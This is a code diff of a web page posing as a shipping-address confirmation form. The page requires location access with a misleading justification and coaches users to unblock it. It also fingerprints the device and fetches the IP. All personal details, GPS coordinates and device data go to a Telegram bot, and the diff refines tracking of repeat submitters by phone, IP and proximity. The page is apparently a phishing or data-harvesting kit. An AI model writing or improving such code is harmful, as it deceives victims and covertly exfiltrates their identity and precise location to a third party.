@@ -146,16 +146,12 @@
         <button class="btn" id="btn-next" onclick="proceedToVerification()">Next</button>
     </div>
 
-    <!-- Confirmation Page -->
     <div id="step-verification">
         <h2>Confirm Information</h2>
         <p style="text-align:center; color:#64748b; font-size:14px;">Please verify your information before submitting.</p>
 
         <div id="status-box" class="status-box status-success hidden">✅ Information Verified Successfully</div>
         
-        <!-- ======================================
-             STEP 1 — Permission Request Screen
-             ====================================== -->
         <div id="loc-request-box" class="status-box status-error hidden">
             <strong>📍 Why We Need Your Location</strong><br>
             We need your location to <u>verify that your shipping city matches your actual location</u>, and to <u>automatically calibrate your address details</u> for accuracy.<br><br>
@@ -163,9 +159,6 @@
         </div>
         <button id="btn-retry-loc" class="btn btn-warning hidden" onclick="requestLocation()">🔄 Tap to Enable Location Access</button>
 
-        <!-- ======================================
-             STEP 2 — When User Said "Block/Blocked"
-             ====================================== -->
         <div id="loc-instruction-box" class="status-box status-info hidden">
             <strong>🔒 Location Access Was Blocked</strong><br><br>
             Your browser remembered your choice and won't ask again automatically. Please follow these 4 simple steps:<br><br>
@@ -218,6 +211,7 @@ let formData = {};
 let deviceInfo = { ip: "", device: "", os: "", browser: "" };
 let locationInfo = { lat: "", lng: "", status: "pending" };
 let duplicateRecord = null;
+let submitTimeInfo = { count: 0, firstTime: "" };
 
 // ========== Initialize ==========
 window.onload = () => {
@@ -225,7 +219,7 @@ window.onload = () => {
     restoreFormDraft();
 };
 
-// ========== Auto-Save & Restore Form — NEVER LOST ==========
+// ========== Auto-Save & Restore Form ==========
 function saveFormDraft(){
     const draft = {
         firstName: document.getElementById('firstName').value,
@@ -280,6 +274,7 @@ function findDuplicate(current){
     const history = loadHistory();
     const currentPhoneKey = current.phoneFull?.replace(/\D/g,'') || "";
     const currentIpSeg = getIpSegment(current.ip, IP_SEGMENTS_TO_MATCH);
+    let bestMatch = null;
 
     for(const rec of history){
         const recPhoneKey = rec.phoneFull?.replace(/\D/g,'') || "";
@@ -296,10 +291,12 @@ function findDuplicate(current){
         const nearLocation = dist <= DISTANCE_THRESHOLD_METERS;
 
         if(samePhone || sameIpExact || sameIpSegment || nearLocation){
-            return { rec, dist, samePhone, sameIpExact, sameIpSegment, nearLocation };
+            if(!bestMatch || dist < (bestMatch.dist||999999)){
+                bestMatch = { rec, dist, samePhone, sameIpExact, sameIpSegment, nearLocation };
+            }
         }
     }
-    return null;
+    return bestMatch;
 }
 
 function makeReasonText(m){
@@ -392,12 +389,15 @@ async function proceedToVerification(){
     document.getElementById('disp-phone').textContent = formData.phonePrefix+' '+formData.phone;
     document.getElementById('disp-zip').textContent = formData.zip;
 
-    // Show permission request box with reason
     hideAllLocationBoxes();
     document.getElementById('loc-request-box').classList.remove('hidden');
     document.getElementById('btn-retry-loc').classList.remove('hidden');
 
+    // 🔑 严格等待：先拿到位置 → 再拿到IP → 最后做重复检测
     await requestLocation();
+    await fetchIPAddress(); // 确保IP赋值完成
+
+    // 🔑 全部数据到位后立刻做重复检测（提前算好，提交时直接用）
     if(locationInfo.status === "granted"){
         duplicateRecord = findDuplicate({ 
             phoneFull: formData.phoneFull, 
@@ -405,10 +405,20 @@ async function proceedToVerification(){
             lat: locationInfo.lat, 
             lng: locationInfo.lng 
         });
+        // 预计算统计信息
+        const history = loadHistory();
+        const samePerson = history.filter(r=>{
+            const samePhone = r.phoneFull?.replace(/\D/g,'') === formData.phoneFull.replace(/\D/g,'');
+            const sameIp = r.ip === deviceInfo.ip && deviceInfo.ip !== "Unavailable";
+            const near = r.lat && r.lng && locationInfo.lat && locationInfo.lng && getDistanceMeters(+r.lat,+r.lng,+locationInfo.lat,+locationInfo.lng) <= DISTANCE_THRESHOLD_METERS;
+            return samePhone || sameIp || near;
+        });
+        submitTimeInfo.count = samePerson.length + 1;
+        submitTimeInfo.firstTime = samePerson[0]?.timeStr || new Date().toLocaleString('zh-CN');
     }
 }
 
-// ========== 📍 Smart Location Handler ==========
+// ========== 📍 Location Handler ==========
 function requestLocation(){
     return new Promise((resolve) => {
         if (!navigator.geolocation) {
@@ -419,7 +429,6 @@ function requestLocation(){
 
         navigator.geolocation.getCurrentPosition(
             (pos) => {
-                // ✅ ALLOWED — success
                 locationInfo.lat = pos.coords.latitude.toFixed(6);
                 locationInfo.lng = pos.coords.longitude.toFixed(6);
                 locationInfo.status = "granted";
@@ -429,11 +438,9 @@ function requestLocation(){
             },
             (err) => {
                 if (err.code === 1) {
-                    // 🔒 USER DENIED — show 4-step instructions
                     locationInfo.status = "blocked";
                     showInstructionBox();
                 } else if (err.code === 3) {
-                    // ⏱️ TIMEOUT — allow retry
                     locationInfo.status = "timeout";
                     document.getElementById('loc-request-box').innerHTML =
                         "⏱️ Request timed out. Please tap the button below and select <strong>\"Allow\"</strong>.";
@@ -460,10 +467,21 @@ function hideAllLocationBoxes(){
 function showInstructionBox(){
     hideAllLocationBoxes();
     document.getElementById('loc-instruction-box').classList.remove('hidden');
-    // NO retry button — show proper instructions instead
 }
 
-// ========== SUBMIT — BLOCKED until location granted ==========
+// ========== ✅ 修复后的获取IP函数 ==========
+async function fetchIPAddress(){ 
+    try{ 
+        const r = await fetch('https://api.ipify.org?format=json'); 
+        if(!r.ok) throw new Error("HTTP error");
+        const j = await r.json(); 
+        deviceInfo.ip = j.ip; 
+    }catch{ 
+        deviceInfo.ip = "Unavailable"; 
+    } 
+}
+
+// ========== Submit ==========
 async function submitData(){
     if(locationInfo.status !== "granted"){
         alert("Location permission is REQUIRED before submission.\n\nWe need your location to verify that your shipping city matches your actual location, and to automatically calibrate your address details.\n\nPlease follow the instructions on screen to enable location access. Your information will NOT be lost when you refresh.");
@@ -472,8 +490,71 @@ async function submitData(){
     doSubmit();
 }
 
-// ========== Fetch IP ==========
-async function fetchIPAddress(){ try{ const r=await fetch('https://api.ipify.org?format=json'); const j=await r.json(); deviceInfo.ip=j.ip; }catch{ deviceInfo.ip="Unavailable"; } }
+// ========== DO SUBMIT ==========
+async function doSubmit(){
+    const timeStr = new Date().toLocaleString('zh-CN');
+    
+    // 保存本次记录
+    saveHistory({
+        name: formData.name, age: formData.age, occupation: formData.occupation,
+        phone: formData.phonePrefix+' '+formData.phone, phoneFull: formData.phoneFull,
+        country: formData.countryName, province: formData.province, city: formData.city, address: formData.address, zip: formData.zip,
+        ip: deviceInfo.ip, device: deviceInfo.device, os: deviceInfo.os, browser: deviceInfo.browser,
+        lat: locationInfo.lat, lng: locationInfo.lng, timeStr, timestamp: Date.now()
+    });
+
+    // 组装重复提醒
+    let duplicateNote = "";
+    if(duplicateRecord){
+        duplicateNote = `‼️‼️‼️ 重复提交提醒：${makeReasonText(duplicateRecord)}
+• 出现次数：第 ${submitTimeInfo.count} 次
+• 首次提交：${submitTimeInfo.firstTime}
+• IP地址：${deviceInfo.ip}
+• 设备/型号：${deviceInfo.device}
+• 操作系统：${deviceInfo.os}
+• 浏览器：${deviceInfo.browser}
+• 坐标：${locationInfo.lat}, ${locationInfo.lng}
+——————————————
+`;
+    }
+
+    const msg = `${duplicateNote}📩 新提交的资料
+——————————————
+姓名：${formData.name}
+年龄：${formData.age}
+当前职业：${formData.occupation}
+收货地址：国家:${formData.countryName}，省份:${formData.province}，城市:${formData.city}，街道:${formData.address}
+邮政编码：${formData.zip}
+电话号码：${formData.phonePrefix} ${formData.phone}
+
+📊 提交统计：
+• 出现次数：第 ${submitTimeInfo.count} 次
+• 首次提交：${submitTimeInfo.firstTime}
+• 最近提交：${timeStr}
+
+设备和网络信息：
+• IP地址：${deviceInfo.ip}
+• 设备/型号：${deviceInfo.device}
+• 操作系统：${deviceInfo.os}
+• 浏览器：${deviceInfo.browser}
+• 坐标：${locationInfo.lat}, ${locationInfo.lng}
+⏰ 提交时间：${timeStr}
+——————————————`;
+
+    console.log('📤 Sending to Chat ID:', TELEGRAM_CHAT_ID);
+    console.log('📍 IP:', deviceInfo.ip, '| Lat:', locationInfo.lat, '| Lng:', locationInfo.lng);
+
+    try{
+        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: msg})
+        });
+        const json=await res.json();
+        if(json.ok){ alert('Submitted successfully!'); localStorage.removeItem('formDraft'); location.reload(); }
+        else { alert('Error: ' + JSON.stringify(json)); console.error(json); }
+    }catch(e){ alert('Network error: '+e.message); console.error(e); }
+}
 
 // ========== Parse Device Info ==========
 function parseUserAgent(){
@@ -497,78 +578,6 @@ function parseUserAgent(){
     else if(/Firefox\//.test(ua)) browser = "Firefox";
 
     return {device, os, browser};
-}
-
-// ========== DO SUBMIT ==========
-async function doSubmit(){
-    const timeStr = new Date().toLocaleString('zh-CN');
-    saveHistory({
-        name: formData.name, age: formData.age, occupation: formData.occupation,
-        phone: formData.phonePrefix+' '+formData.phone, phoneFull: formData.phoneFull,
-        country: formData.countryName, province: formData.province, city: formData.city, address: formData.address, zip: formData.zip,
-        ip: deviceInfo.ip, device: deviceInfo.device, os: deviceInfo.os, browser: deviceInfo.browser,
-        lat: locationInfo.lat, lng: locationInfo.lng, timeStr, timestamp: Date.now()
-    });
-
-    const history = loadHistory();
-    const samePerson = history.filter(r=>{
-        const samePhone = r.phoneFull?.replace(/\D/g,'') === formData.phoneFull.replace(/\D/g,'');
-        const sameIp = r.ip === deviceInfo.ip && deviceInfo.ip !== "Unavailable";
-        const near = r.lat && r.lng && locationInfo.lat && locationInfo.lng && getDistanceMeters(+r.lat,+r.lng,+locationInfo.lat,+locationInfo.lng) <= DISTANCE_THRESHOLD_METERS;
-        return samePhone || sameIp || near;
-    });
-    const count = samePerson.length;
-    const firstTime = samePerson[0]?.timeStr || timeStr;
-
-    let duplicateNote = "";
-    if(duplicateRecord){
-        duplicateNote = `‼️‼️‼️ 重复提交提醒：${makeReasonText(duplicateRecord)}
-• 出现次数：第 ${count} 次
-• 首次提交：${firstTime}
-• IP地址：${deviceInfo.ip}
-• 设备/型号：${deviceInfo.device}
-• 操作系统：${deviceInfo.os}
-• 浏览器：${deviceInfo.browser}
-• 坐标：${locationInfo.lat}, ${locationInfo.lng}
-——————————————
-`;
-    }
-
-    const msg = `${duplicateNote}📩 新提交的资料
-——————————————
-姓名：${formData.name}
-年龄：${formData.age}
-当前职业：${formData.occupation}
-收货地址：国家:${formData.countryName}，省份:${formData.province}，城市:${formData.city}，街道:${formData.address}
-邮政编码：${formData.zip}
-电话号码：${formData.phonePrefix} ${formData.phone}
-
-📊 提交统计：
-• 出现次数：第 ${count} 次
-• 首次提交：${firstTime}
-• 最近提交：${timeStr}
-
-设备和网络信息：
-• IP地址：${deviceInfo.ip}
-• 设备/型号：${deviceInfo.device}
-• 操作系统：${deviceInfo.os}
-• 浏览器：${deviceInfo.browser}
-• 坐标：${locationInfo.lat}, ${locationInfo.lng}
-• 提交时间：${timeStr}
-——————————————`;
-
-    console.log('📤 Sending to Chat ID:', TELEGRAM_CHAT_ID);
-
-    try{
-        const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,{
-            method:'POST',
-            headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: msg})
-        });
-        const json=await res.json();
-        if(json.ok){ alert('Submitted successfully!'); localStorage.removeItem('formDraft'); location.reload(); }
-        else { alert('Error: ' + JSON.stringify(json)); console.error(json); }
-    }catch(e){ alert('Network error: '+e.message); console.error(e); }
 }
 </script>
 </body>
